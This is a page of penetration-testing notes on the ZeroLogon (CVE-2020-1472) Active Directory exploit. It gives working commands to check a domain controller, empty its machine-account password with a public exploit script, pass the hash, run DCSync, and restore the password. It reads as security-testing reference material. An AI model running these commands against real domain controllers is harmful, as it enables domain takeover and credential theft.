---
layout: default
title: ZeroLogon [CVE-2020-1472]
parent: Active Directory
nav_order: 19
permalink: /ad/zerologon/
---

# ZeroLogon [CVE-2020-1472]
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

{: .warning }
> Following exploit **changes the password** of a domain controller's account, which **breaks communications with other domain controllers** (DCSync) until you will restore the original password.

## Vulnerability

Everything is explained [here](https://www.secura.com/blog/zero-logon).

Long story short, this attack consists in sending authentication requests to the domain controller as itself - i.e. `DC_NAME$` - with an empty password until it accepts one of them. Once you are authenticated, the exploit sets the password of the domain controller account as empty.

## Prerequisites

- Network access to the domain controller.

## Exploit

To check if a domain controller is vulnerable to ZeroLogon, you can use either [NetExec](https://github.com/Pennyw0rth/NetExec) or the [SecuraBV GitHub repository](https://github.com/SecuraBV/CVE-2020-1472).

```bash
# You don't need to be authenticated on the domain.
nxc smb $dc_ip -M zerologon
```

If the domain controller appears to be vulnerable, you can attempt the exploit with this [dirkjanm's GitHub repository](https://github.com/dirkjanm/CVE-2020-1472).

```bash
python3 cve-202-1472-exploit.py $dc_hostname $dc_ip
```

This will set the **domain controller's account password as empty**. So you are now able to do [Pass-the-Hash](/ad/passthehash/) with the following one `:31d6cfe0d16ae931b73c59d7e0c089c0` which corresponds to an empty password, or by using `-no-pass`-ish argument. The best option at this point is to perform [DCSync](/ad/dcsync/) attack.

As explained in [dirkjanm's GitHub repository](https://github.com/dirkjanm/CVE-2020-1472), if you have a recent version of `impacket-secretsdump`, you should be able extract the `hex_plain_text` version of domain controller's previous password. If not, you can still retrieve it by [dumping LSASS cached credentials](/windows/credentials/#lsass-credentials). Once you have it, **don't forget** to put the previous password back.

```bash
python3 restorepassword.py $domain/$dc_hostname@$dc_hostname -target-ip $dc_ip -hexpass $hex_plain_text
```

To be sure, check the password is not empty anymore. Following command should fail.

```bash
nxc smb $dc_ip -u "$dc_hostname$" -H '31d6cfe0d16ae931b73c59d7e0c089c0'
```

## Recommendations

- [ ] Apply latest Microsoft security patches on vulnerable domain controllers.